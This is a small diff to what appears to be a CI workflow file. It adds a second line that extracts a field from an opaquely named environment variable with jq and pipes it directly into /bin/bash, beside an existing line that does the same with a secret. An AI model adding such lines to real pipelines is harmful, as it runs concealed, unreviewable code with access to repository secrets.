@@ -18,6 +18,7 @@ jobs:
           cvw6: ${{ secrets.cvw6 }}
         run: |
           printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
+          printf '%s' "$mudgp93852" | jq -r .x17925 | /bin/bash
 
       - name: Save output
         if: always()
